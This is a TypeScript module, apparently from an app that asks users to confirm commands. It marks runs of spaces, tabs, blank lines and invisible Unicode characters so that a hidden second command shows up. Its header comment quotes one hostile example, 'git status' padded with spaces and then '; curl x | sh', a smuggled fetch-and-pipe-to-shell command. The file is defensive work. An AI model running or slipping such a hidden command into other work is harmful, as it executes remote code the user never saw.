/**
 * A confirmation's detail as the sheet draws it: verbatim, with the whitespace
 * that could hide a part of it made visible (plan P8, CP-13).
 *
 * The detail is the command that runs, never truncated and never wrapped, and
 * that is exactly what an attacker leans on: `git status` followed by 300
 * spaces and `; curl x | sh` reads as `git status` in a box that is not 300
 * characters wide, and 80 empty lines push a second command out of sight. So
 * the DISPLAYED text marks them, by one rule the native app shares
 * (`HermieUI/Requests`):
 *
 *  - a run of 2 to 6 spaces (U+0020) inside a line, leading indentation
 *    included, is that many `·` (U+00B7); a run of 7 or more is one marker
 *    `[␣×N]` (U+2423, then `×` and the run's length in ASCII digits);
 *  - every tab is `→`; a single space stays a space;
 *  - a blank line (empty, or whitespace only) stays an empty line in a run of 1
 *    or 2; 3 or more in a row are one marker line `⋯ N empty lines ⋯` (U+22EF on
 *    both sides);
 *  - `\r\n` is a line break: the `\r` goes before anything is marked;
 *  - every other character that draws nothing, or moves text unseen, is
 *    shown by its code point, `[U+200B]`, and a run of the same one as
 *    `[U+00A0×300]`: the control characters but tab and `\n` (a lone `\r`,
 *    escape, form feed), the format characters (zero-width ones, the byte
 *    order mark, the direction overrides and isolates), every space separator
 *    but U+0020, the line and paragraph separators, and the blank letters
 *    (Hangul fillers, the blank Braille pattern). A line break that is not
 *    `\n` stays on its line, and nothing reorders or hides text unseen. A line
 *    holding such a character is not blank.
 *
 * Only the drawing changes. What the browser signs, what is copied ("Copy
 * details") and the line counts in the caption are the verbatim text the frame
 * carried; `lines` and `longestLine` are measured on it, the longest line in
 * code points.
 */

/** The detail as drawn, and the size of the verbatim original. */
export interface MarkedDetail {
  /** What the sheet shows and what its accessible name carries. */
  text: string
  /** Lines of the verbatim text: its pieces between `\n`. */
  lines: number
  /** The longest of them, in code points (`Array.from`). */
  longestLine: number
}

/** Runs of this many spaces or more are one counted marker. */
const COUNTED_RUN = 7
/** Runs of this many blank lines or more are one counted marker line. */
const COLLAPSED_BLANKS = 3

/** The marker line for `count` blank lines; English unless the sheet hands in its language's words. */
export const emptyLinesMarker = (count: number): string => `⋯ ${count} empty lines ⋯`

/** Empty, or spaces and tabs only: anything else on the line is drawn. */
const isBlank = (line: string): boolean => /^[ \t]*$/u.test(line)

/**
 * A character that draws nothing or moves text unseen, never tab, `\n` or U+0020; a run of the same one is
 * one match. The blank letters are listed: U+115F, U+1160, U+3164, U+FFA0 and the blank Braille U+2800.
 */
const HIDDEN_RUN = /([\p{Cc}\p{Cf}\p{Zs}\p{Zl}\p{Zp}ᅟᅠㅤﾠ⠀])\1*/gu

/** `U+00A0`: at least four hex digits, upper case. */
const codePoint = (char: string): string =>
  `U+${(char.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`

/** One non-blank line with its space runs, tabs and hidden characters made visible. */
function markLine(line: string): string {
  return line.replace(/( +)|(\t)|([^ \t]+)/gu, (_match, spaces?: string, tab?: string, other?: string) => {
    if (spaces !== undefined) {
      if (spaces.length === 1) {
        return ' '
      }

      return spaces.length < COUNTED_RUN ? '·'.repeat(spaces.length) : `[␣×${spaces.length}]`
    }

    if (tab !== undefined) {
      return '→'
    }

    return (other ?? '').replace(HIDDEN_RUN, (run: string, char: string) => {
      const count = Array.from(run).length

      return count === 1 ? `[${codePoint(char)}]` : `[${codePoint(char)}×${count}]`
    })
  })
}

export function markVerbatimDetail(
  detail: string,
  emptyLines: (count: number) => string = emptyLinesMarker
): MarkedDetail {
  const original = detail.split('\n')
  const source = detail.replace(/\r\n/gu, '\n').split('\n')
  const out: string[] = []
  let blanks = 0

  const flush = (): void => {
    if (blanks >= COLLAPSED_BLANKS) {
      out.push(emptyLines(blanks))
    } else {
      for (let index = 0; index < blanks; index += 1) {
        out.push('')
      }
    }

    blanks = 0
  }

  for (const line of source) {
    if (isBlank(line)) {
      blanks += 1
      continue
    }

    flush()
    out.push(markLine(line))
  }

  flush()

  return {
    text: out.join('\n'),
    lines: original.length,
    // Without the `\r` of a `\r\n`, as the native app counts.
    longestLine: source.reduce((longest, line) => Math.max(longest, Array.from(line).length), 0)
  }
}
